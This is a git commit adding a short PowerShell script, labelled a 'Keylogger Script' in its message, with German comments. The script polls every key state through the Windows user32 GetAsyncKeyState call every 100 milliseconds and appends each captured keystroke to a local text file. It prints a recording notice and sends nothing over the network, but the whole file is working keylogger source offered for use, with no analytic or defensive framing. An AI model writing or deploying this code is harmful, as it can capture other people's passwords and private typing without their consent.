929280b0ee7ab2621bf1b9ac1a013e0a54399921
LucaHoffmann4 <lucahoffmann4@outlook.de>
2025-05-14 08:24:31 +0200

    Add files via upload
    Keylogger Script

---
+++ PS_Tastatur.ps1
@@ -0,0 +1,33 @@
+# Importieren der benötigten .NET-Klassen
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class KeyboardListener {
+    [DllImport("user32.dll")]
+    public static extern int GetAsyncKeyState(Int32 i);
+
+    public static string Listen() {
+        string keys = "";
+        for (int i = 0; i < 255; i++) {
+            int keyState = GetAsyncKeyState(i);
+            if (keyState == 1 || keyState == -32767) {
+                keys += ((ConsoleKey)i).ToString() + " ";
+            }
+        }
+        return keys;
+    }
+}
+"@
+
+# Hauptlogik
+$logFile = "C:\Users\Hacker\Desktop\Scripts\tastatureingaben.txt"
+Write-Host "Tastatureingaben werden aufgezeichnet. Drücken Sie STRG+C, um zu beenden."
+
+while ($true) {
+    Start-Sleep -Milliseconds 100
+    $keys = [KeyboardListener]::Listen()
+    if ($keys -ne "") {
+        Add-Content -Path $logFile -Value $keys
+    }
+}
